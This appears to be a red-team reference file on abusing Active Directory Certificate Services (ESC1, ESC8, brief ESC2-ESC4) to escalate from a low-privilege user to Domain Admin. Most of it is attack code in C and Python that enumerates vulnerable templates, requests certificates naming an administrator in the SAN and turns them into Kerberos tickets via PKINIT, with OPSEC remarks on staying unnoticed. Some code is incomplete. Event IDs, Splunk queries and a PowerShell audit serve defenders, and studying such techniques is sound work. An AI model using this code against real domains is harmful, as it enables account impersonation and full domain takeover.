# AD CS Abuse Code Patterns

**MITRE ATT&CK**: [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

AD CS provides PKI infrastructure for digital certificates in AD environments.
Misconfigurations in certificate templates, enrollment permissions, and CA settings
create paths allowing low-privilege users to escalate to Domain Admin by obtaining
certificates for arbitrary principals. Key patterns cataloged by SpecterOps as
ESC1-ESC8. This file focuses on ESC1 and ESC8 with brief ESC2-ESC4 coverage.

## AD CS Architecture

```
 Enterprise CA (Issuing CA)
 |
 +-- Certificate Templates (stored as AD objects)
 |   +-- "User" (default, safe): Subject from AD attrs, Client Auth EKU
 |   +-- "VulnTemplate" (ESC1): ENROLLEE_SUPPLIES_SUBJECT + Client Auth + Domain Users
 |
 +-- Enrollment Endpoints
 |   +-- RPC/DCOM (default)
 |   +-- HTTP /certsrv/ (optional)  <-- ESC8 relay target
 |   +-- CEP/CES (optional)
 |
 +-- CA Configuration
     +-- EDITF_ATTRIBUTESUBJECTALTNAME2  <-- ESC6
     +-- CA permissions (issue, manage)  <-- ESC7
```

## ESC1: Enrollee-Supplies-Subject + Client Auth

```
 Attacker (Domain User)           CA Server              Domain Controller
 ======================           =========              =================
        |  1. LDAP: enumerate         |                         |
        |  certificate templates      |                         |
        |---------------------------->|                         |
        |  2. Find template with      |                         |
        |  ENROLLEE_SUPPLIES_SUBJECT  |                         |
        |  + Client Auth EKU          |                         |
        |  + low-priv enrollment      |                         |
        |  3. CSR with SAN:           |                         |
        |  UPN=admin@corp.local       |                         |
        |---------------------------->|                         |
        |  4. Cert issued with        |                         |
        |  admin's UPN in SAN         |                         |
        |<----------------------------|                         |
        |  5. PKINIT: cert -> TGT     |                         |
        |-------------------------------------------->          |
        |  6. TGT for admin           |                         |
        |<--------------------------------------------|         |
```

## Template Enumeration via LDAP (C)

```c
/*
 * DETECTION: LDAP queries to CN=Certificate Templates in Configuration NC are
 * unusual from workstations but not flagged by default. Enrollment is the key event.
 * OPSEC: Template enumeration is read-only, minimal logging. Use LDAPS.
 */
#include <windows.h>
#include <winldap.h>
#include <stdio.h>
#pragma comment(lib, "wldap32.lib")

#define CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 0x00000001

int enumerate_vulnerable_templates(const wchar_t *dc) {
    LDAP *ld = NULL; LDAPMessage *result = NULL, *entry = NULL;
    PWCHAR attrs[] = { L"cn", L"msPKI-Certificate-Name-Flag",
                       L"pKIExtendedKeyUsage", L"msPKI-Enrollment-Flag",
                       L"nTSecurityDescriptor", NULL };

    ld = ldap_sslinit((PWCHAR)dc, LDAP_SSL_PORT, 1);
    if (!ld) return -1;
    ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);

    /* OPSEC: Standard read -- all authed users can read Configuration NC */
    PWCHAR base = L"CN=Certificate Templates,CN=Public Key Services,"
                  L"CN=Services,CN=Configuration,DC=corp,DC=local";
    ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE,
                  L"(objectClass=pKICertificateTemplate)", attrs, 0, &result);

    for (entry = ldap_first_entry(ld, result); entry;
         entry = ldap_next_entry(ld, entry)) {
        PWCHAR *cn_vals = ldap_get_values(ld, entry, L"cn");
        PWCHAR *flag_vals = ldap_get_values(ld, entry, L"msPKI-Certificate-Name-Flag");
        DWORD name_flag = (flag_vals && flag_vals[0]) ? _wtoi(flag_vals[0]) : 0;

        /* Check pKIExtendedKeyUsage for Client Auth / Any Purpose / empty */
        PWCHAR *eku_vals = ldap_get_values(ld, entry, L"pKIExtendedKeyUsage");
        BOOL has_client_auth = (!eku_vals || !eku_vals[0]);  /* Empty = any purpose */
        if (eku_vals) {
            for (ULONG i = 0; eku_vals[i]; i++) {
                if (wcsstr(eku_vals[i], L"1.3.6.1.5.5.7.3.2") ||   /* Client Auth */
                    wcsstr(eku_vals[i], L"1.3.6.1.4.1.311.20.2.2") || /* Smart Card */
                    wcsstr(eku_vals[i], L"2.5.29.37.0"))              /* Any Purpose */
                    { has_client_auth = TRUE; break; }
            }
        }

        if ((name_flag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) && has_client_auth)
            wprintf(L"[!] ESC1 VULNERABLE: %s (flag=0x%08x)\n", cn_vals[0], name_flag);

        if (cn_vals)  ldap_value_free(cn_vals);
        if (flag_vals) ldap_value_free(flag_vals);
        if (eku_vals) ldap_value_free(eku_vals);
    }
    ldap_msgfree(result); ldap_unbind(ld);
    return 0;
}
```

## CSR Construction with Alternate SAN (C Pseudocode)

```c
/*
 * DETECTION: Event 4887 (request received), 4886 (cert issued).
 *   SAN in issued cert is logged. SAN != requester identity is anomalous.
 * OPSEC: Enrollment is the primary detection point. Once issued, the cert
 *   can authenticate without further CA contact. Validity = persistence window.
 */
#include <windows.h>
#include <certsrv.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

/* Flow: keygen -> PKCS#10 CSR with target UPN in SAN -> submit to CA
 * SAN attribute honored only if template has ENROLLEE_SUPPLIES_SUBJECT (ESC1)
 * or CA has EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6). */
HRESULT request_certificate_esc1(
    const wchar_t *ca_name, const wchar_t *template_name,
    const wchar_t *target_upn) {
    ICertRequest2 *pReq = NULL;
    CoInitialize(NULL);
    CoCreateInstance(&CLSID_CCertRequest, NULL, CLSCTX_INPROC_SERVER,
                     &IID_ICertRequest2, (void **)&pReq);

    /* DETECTION: The SAN:upn= attribute is where the attack diverges.
     * Legitimate enrollment uses requester's own UPN or CA-built subject. */
    wchar_t attribs[512];
    swprintf(attribs, 512, L"CertificateTemplate:%s\nSAN:upn=%s",
             template_name, target_upn);

    LONG disposition = 0;
    /* DETECTION: Event 4887 (request) + 4886 (issued if auto-approved) */
    pReq->Submit(CR_IN_BASE64 | CR_IN_FORMATANY,
                 csr_base64, attribs, ca_name, &disposition);
    if (disposition == CR_DISP_ISSUED) {
        BSTR cert = NULL;
        pReq->GetCertificate(CR_OUT_BASE64, &cert);
        wprintf(L"[+] Certificate issued with SAN: %s\n", target_upn);
        SysFreeString(cert);
    }
    pReq->Release(); CoUninitialize();
    return S_OK;
}
```

## PKINIT: Certificate to TGT

```
 Attacker (forged cert)               KDC
 ======================               ===
   |  AS-REQ + PA-PK-AS-REQ             |
   |  (cert + signed authenticator)     |
   |------------------------------------>|  Validates: trusted CA? Valid template?
   |                                     |  Extracts SAN UPN -> admin@corp.local
   |  AS-REP: TGT for admin             |  Maps UPN to AD account
   |<------------------------------------|
   |  Domain Admin access                |
```

## Python: Certificate Request Flow (Certipy-Style)

```python
"""
DETECTION: Event 4887/4886 on CA; Event 4768 Pre-Auth Type 16 (PKINIT);
  SAN mismatch; enrollment in rarely-used templates.
OPSEC: Enrollment creates persistent CA audit trail. Cert serial/thumbprint
  traceable. Validity period = persistence window (default 1-2 years).
"""
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
import ldap3

def enumerate_templates(dc_ip, domain, username, password):
    """ESC1 conditions: ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU +
    low-priv enrollment + no manager approval + msPKI-RA-Signature=0."""
    server = ldap3.Server(dc_ip, port=636, use_ssl=True)
    conn = ldap3.Connection(server, user=f"{domain}\\{username}",
                            password=password, authentication=ldap3.NTLM)
    conn.bind()
    config_dn = (f"CN=Certificate Templates,CN=Public Key Services,"
                 f"CN=Services,CN=Configuration,DC={domain.replace('.', ',DC=')}")
    conn.search(search_base=config_dn,
                search_filter="(objectClass=pKICertificateTemplate)",
                attributes=["cn", "msPKI-Certificate-Name-Flag",
                             "pKIExtendedKeyUsage", "msPKI-RA-Signature"])
    vulnerable = []
    for entry in conn.entries:
        name_flag = int(str(entry["msPKI-Certificate-Name-Flag"]))
        ekus = entry["pKIExtendedKeyUsage"].values if entry["pKIExtendedKeyUsage"] else []
        ra_sig = int(str(entry["msPKI-RA-Signature"])) if entry["msPKI-RA-Signature"] else 0
        supplies_subject = (name_flag & 0x1) != 0
        has_client_auth = (not ekus or "1.3.6.1.5.5.7.3.2" in ekus or
                           "1.3.6.1.4.1.311.20.2.2" in ekus or "2.5.29.37.0" in ekus)
        if supplies_subject and has_client_auth and ra_sig == 0:
            vulnerable.append(str(entry.cn))
            print(f"[!] ESC1 candidate: {entry.cn}")
    conn.unbind()
    return vulnerable

def build_csr(target_upn):
    """Core of ESC1: SAN with target UPN determines authentication identity.
    DETECTION: SAN value appears in Event 4887 (request) and 4886 (issuance)."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    csr = x509.CertificateSigningRequestBuilder().subject_name(
        x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "User")])
    ).add_extension(
        x509.SubjectAlternativeName([
            x509.OtherName(
                x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),  # UPN OID
                target_upn.encode("utf-8"))]),
        critical=False
    ).sign(key, hashes.SHA256())
    return key, csr

def pkinit_auth(dc_ip, domain, cert_pfx, cert_password):
    """DETECTION: Event 4768 Pre-Auth Type 16 (PA-PK-AS-REQ). Cert thumbprint logged.
    OPSEC: PKINIT uncommon in many environments; EDR may flag non-smart-card usage."""
    # Build AS-REQ with PA-PK-AS-REQ; KDC validates cert chain, extracts SAN UPN
    # Returns TGT for the SAN identity + NTLM hash via U2U
    pass  # certipy auth -pfx admin.pfx -dc-ip <DC_IP>
```

## ESC8: NTLM Relay to HTTP Enrollment

```
 Victim (DC$)          Attacker (relay)       CA Web Enrollment
 ============          ================       ==================
   |  NTLM auth coerced   |                        |
   |---------------------->|  Forward auth to CA    |
   |  NTLM Challenge      |----------------------->|
   |<----------------------|                        |
   |  NTLM Response       |  Relay response        |
   |---------------------->|----------------------->|
   |                       |  Authed as DC$ ->      |
   |                       |  Submit CSR (Machine)  |
   |                       |----------------------->|
   |                       |  Cert for DC$ issued   |
   |                       |<-----------------------|
   |                       |  S4U2Self -> DA TGT    |

 Blocked by: HTTPS with Extended Protection for Authentication (EPA).
```

## ESC2-ESC4 Brief Coverage

```
 ESC2: Any Purpose EKU or No EKU
   Template with EKU "Any Purpose" (2.5.29.37.0) or empty EKU.
   Cert authenticates as REQUESTER (not arbitrary user). Useful for persistence.

 ESC3: Enrollment Agent Template
   Template with Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1).
   Two-step: get agent cert -> co-sign request for arbitrary user.

 ESC4: Template ACL Misconfiguration
   Low-priv principal has WRITE on template object -> modify to add
   ENROLLEE_SUPPLIES_SUBJECT -> exploit as ESC1.
   DETECTION: Event 4899 (template changed) -- highly anomalous for non-admins.
```

## Detection Indicators

| Indicator | Source | Details |
|---|---|---|
| Event 4887 | CA audit log | Certificate request received; check requester vs SAN |
| Event 4886 | CA audit log | Certificate issued; SAN should match requester identity |
| Event 4768 | Security log (DC) | PKINIT auth (Pre-Auth Type 16); cert thumbprint logged |
| Anomalous SAN | CA audit log | SAN UPN does not match requesting user's UPN |
| Template usage | CA audit log | Enrollment in rarely-used or custom templates |
| Event 4899 | CA audit log | Certificate template modification (ESC4) |
| HTTP enrollment | IIS logs | POST to /certsrv/certfnsh.asp from non-admin IPs |
| NTLM relay | Network/IDS | NTLM auth forwarded to CA web enrollment endpoint |

```
# Certificates issued with SAN mismatch
index=ca_audit EventCode=4886
| eval mismatch=if(Requester!=Subject_Alternative_Name,"YES","NO")
| where mismatch="YES"

# PKINIT authentication events
index=wineventlog EventCode=4768 Pre_Authentication_Type=16
| stats count by Account_Name, Certificate_Thumbprint, Client_Address
```

**Proactive defense:**
```powershell
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
    -Filter {objectClass -eq 'pKICertificateTemplate'} `
    -Properties msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage |
    Where-Object { $_.'msPKI-Certificate-Name-Flag' -band 1 } |
    Select-Object Name, @{N='Flag';E={$_.'msPKI-Certificate-Name-Flag'}}
```

## Cross-References

- [AD CS Attacks Narrative](../../12-active-directory-deep-dive/adcs-attacks.md) -- full ESC1-ESC11 analysis and remediation
- [Kerberos Attacks Narrative](../../12-active-directory-deep-dive/kerberos-attacks.md) -- PKINIT within Kerberos auth
- [Kerberoasting Implementation](kerberoasting-implementation.md) -- alternative credential access
- [DCSync Internals](dcsync-internals.md) -- post-exploitation after DA via AD CS
- [AD Persistence](../../12-active-directory-deep-dive/ad-persistence.md) -- certificates as long-lived persistence
